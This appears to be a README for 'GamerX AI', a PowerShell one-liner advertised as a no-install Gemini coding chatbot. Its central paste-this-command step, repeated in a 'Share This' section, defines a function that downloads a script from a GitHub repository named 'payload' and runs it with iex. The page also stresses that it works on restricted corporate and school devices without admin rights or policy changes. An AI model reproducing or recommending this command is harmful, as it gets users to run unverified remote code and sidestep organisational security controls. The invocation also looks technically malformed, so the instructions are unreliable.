# GamerX AI - Super Simple One-Liner (No Installation!)

## 🚀 Just Copy and Paste!

**No installation. No admin. No storage. Just works.**

### Step 1: Open PowerShell

Open PowerShell (any user, no admin needed)

### Step 2: Paste This Command

```powershell
function ai { param([Parameter(Mandatory=$false, ValueFromRemainingArguments=$true)][string]$Query); iex (iwr 'https://raw.githubusercontent.com/GraphicsAndroid65/payload/main/chatbot-stateless.ps1').Content -ArgumentList $Query }
```

### Step 3: Start Using!

```powershell
ai "write a python function to reverse a string"
```

**That's it!** 🎉

---

## 💻 Usage

```powershell
ai "write a python function"
ai "write javascript code to fetch API"
ai "C# code to read file"
ai -help
```

---

## ✨ Features

✅ **No Installation** - Just paste and use
✅ **No Admin** - Works on any Windows device
✅ **No Storage** - No data saved locally
✅ **No History** - Each query is independent
✅ **Direct API** - Sends directly to Google Gemini
✅ **Code-Only** - No explanations or comments
✅ **Works Anywhere** - Corporate, school, home

---

## 🔄 How It Works

1. You type: `ai "your question"`
2. Script sends to Google Gemini API
3. API returns code
4. Code is printed to screen
5. Nothing is saved

**That's it!**

---

## 📝 Examples

### Python
```powershell
ai "write a function to check if number is prime"
```

### JavaScript
```powershell
ai "write code to fetch data from API"
```

### C#
```powershell
ai "write code to read file"
```

### SQL
```powershell
ai "write query to get top 10 users"
```

---

## 🎯 Share This

Tell others:

```
Open PowerShell and paste:
function ai { param([Parameter(Mandatory=$false, ValueFromRemainingArguments=$true)][string]$Query); iex (iwr 'https://raw.githubusercontent.com/GraphicsAndroid65/payload/main/chatbot-stateless.ps1').Content -ArgumentList $Query }

Then use:
ai "write a python function"
```

---

## ✅ No Permissions Needed

✓ No admin required
✓ No profile changes
✓ No execution policy changes
✓ No file storage
✓ No local data
✓ Works on restricted devices

---

## 🚀 Ready to Use!

Just paste the command and start coding!

```powershell
ai "write hello world in python"
```

Enjoy! 🎉

---

**Version**: 1.0
**Installation**: None (just paste)
**Admin Required**: ❌ NO
**Data Stored**: ❌ NO
**Brand**: GamerX AI
**Status**: ✅ Production Ready
